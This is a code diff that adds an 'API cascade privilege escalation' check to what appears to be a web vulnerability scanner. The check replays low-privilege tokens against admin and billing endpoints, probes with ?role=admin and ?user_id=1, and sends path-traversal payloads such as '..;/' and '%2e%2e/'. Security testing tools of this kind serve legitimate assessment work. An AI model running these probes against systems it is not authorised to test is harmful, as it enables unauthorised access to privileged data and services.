@@ -18564,3 +18564,153 @@ def scan_subdomain_brute_deep(target):
                 })
 
     return findings, list(subdomains_found)
+
+
+# ---------------------------------------------------------------------------
+# NOVEL: API Cascade Privilege Escalation
+# Exploits trust between microservices sharing the same auth gateway.
+# Most apps validate auth at the gateway but don't re-validate at each service.
+# ---------------------------------------------------------------------------
+
+def scan_api_cascade_privesc(crawl_data, web_targets):
+    """API Cascade Privilege Escalation — exploit inter-service trust.
+    
+    Novel attack: When multiple microservices share an API gateway, a token
+    valid for Service A is often accepted by Service B without checking
+    if the user has permissions for Service B's resources.
+    
+    This finds cases where:
+    1. A low-privilege endpoint gives you a token/session
+    2. That same token works on higher-privilege endpoints
+    3. The higher-privilege endpoint returns data it shouldn't
+    """
+    findings = []
+
+    # Step 1: Map service boundaries from URL patterns
+    service_map = {}  # service_name -> [endpoints]
+    for url in list(crawl_data.get("params", {}).keys()) + [p["url"] for p in crawl_data.get("pages", [])]:
+        parsed = urllib.parse.urlparse(url)
+        parts = parsed.path.strip("/").split("/")
+        if len(parts) >= 2 and parts[0] in ("api", "v1", "v2", "v3"):
+            service = parts[1] if len(parts) > 1 else parts[0]
+            service_map.setdefault(service, []).append(url)
+        elif len(parts) >= 1:
+            service_map.setdefault(parts[0], []).append(url)
+
+    if len(service_map) < 2:
+        return findings
+
+    # Step 2: Categorize services by privilege level
+    high_priv = ["admin", "billing", "payment", "internal", "management",
+                 "config", "settings", "users", "accounts", "audit", "system"]
+    low_priv = ["public", "docs", "health", "status", "search", "products",
+                "catalog", "feed", "news", "blog"]
+
+    high_services = {s: urls for s, urls in service_map.items()
+                     if any(h in s.lower() for h in high_priv)}
+    low_services = {s: urls for s, urls in service_map.items()
+                    if any(l in s.lower() for l in low_priv)}
+
+    # Step 3: Get a session/token from a low-privilege endpoint
+    session_tokens = {}
+    for target in web_targets[:3]:
+        base = target.rstrip("/")
+        # Try to get a token from public/low-priv endpoints
+        for path in ["/api/auth/guest", "/api/public/token", "/api/health",
+                     "/api/docs", "/api/status"]:
+            try:
+                r = _S.get(f"{base}{path}", timeout=_TIMEOUT_SHORT)
+                # Extract any token from response
+                if r.status_code == 200:
+                    # Check cookies
+                    if r.cookies:
+                        session_tokens["cookies"] = dict(r.cookies)
+                    # Check for token in body
+                    token_match = re.search(r'"(?:token|access_token|session)":\s*"([^"]+)"', r.text)
+                    if token_match:
+                        session_tokens["bearer"] = token_match.group(1)
+            except Exception:
+                continue
+
+    # Step 4: Try using low-priv credentials on high-priv endpoints
+    for service_name, urls in high_services.items():
+        for url in urls[:3]:
+            try:
+                # Request without auth (baseline)
+                r_noauth = _S.get(url, timeout=_TIMEOUT_SHORT)
+
+                # Request with low-priv session
+                headers = {}
+                cookies = {}
+                if "bearer" in session_tokens:
+                    headers["Authorization"] = f"Bearer {session_tokens['bearer']}"
+                if "cookies" in session_tokens:
+                    cookies = session_tokens["cookies"]
+
+                r_lowpriv = _S.get(url, headers=headers, cookies=cookies, timeout=_TIMEOUT_SHORT)
+
+                # If low-priv token gives access where no-auth doesn't
+                if r_noauth.status_code in (401, 403) and r_lowpriv.status_code == 200:
+                    if len(r_lowpriv.text) > 100:
+                        findings.append({
+                            "type": f"API Cascade Privilege Escalation ({service_name})",
+                            "severity": "critical",
+                            "url": url,
+                            "detail": f"Low-privilege token accepted by high-privilege service '{service_name}'. "
+                                      f"Gateway trusts token without per-service authorization check.",
+                            "template": "apex-cascade-privesc",
+                        })
+                        break
+
+                # Also test: can we access other users' data in this service?
+                # Try changing user context in the same service
+                if r_lowpriv.status_code == 200:
+                    # Try accessing admin-level operations
+                    admin_ops = [f"{url}/all", f"{url}?role=admin", f"{url}?user_id=1"]
+                    for admin_url in admin_ops:
+                        r_admin = _S.get(admin_url, headers=headers, cookies=cookies,
+                                         timeout=_TIMEOUT_SHORT)
+                        if r_admin.status_code == 200 and len(r_admin.text) > len(r_lowpriv.text) + 200:
+                            findings.append({
+                                "type": f"API Cascade — Cross-Service Data Access ({service_name})",
+                                "severity": "critical",
+                                "url": admin_url,
+                                "detail": f"Low-priv token on '{service_name}' returns elevated data. "
+                                          f"Response +{len(r_admin.text)-len(r_lowpriv.text)} bytes vs normal.",
+                                "template": "apex-cascade-data",
+                            })
+                            break
+            except Exception:
+                continue
+
+    # Step 5: Test cross-service request forgery
+    # If Service A can make requests to Service B internally
+    for target in web_targets[:3]:
+        base = target.rstrip("/")
+        for low_svc in list(low_services.keys())[:3]:
+            for high_svc in list(high_services.keys())[:3]:
+                # Try to reach high-priv service through low-priv service's proxy/redirect
+                proxy_urls = [
+                    f"{base}/api/{low_svc}/../{high_svc}",
+                    f"{base}/api/{low_svc}/%2e%2e/{high_svc}",
+                    f"{base}/api/{low_svc}/..;/{high_svc}",
+                ]
+                for proxy_url in proxy_urls:
+                    try:
+                        r = _S.get(proxy_url, timeout=_TIMEOUT_SHORT)
+                        if r.status_code == 200 and len(r.text) > 100:
+                            # Check if we got high-priv service response
+                            if any(x in r.text.lower() for x in ["admin", "billing", "payment",
+                                                                    "internal", "config"]):
+                                findings.append({
+                                    "type": f"API Cascade — Path Traversal Between Services",
+                                    "severity": "critical",
+                                    "url": proxy_url,
+                                    "detail": f"Traversed from '{low_svc}' to '{high_svc}' via path confusion. "
+                                              f"Internal service routing exploited.",
+                                    "template": "apex-cascade-traversal",
+                                })
+                                break
+                    except Exception:
+                        continue
+    return findings
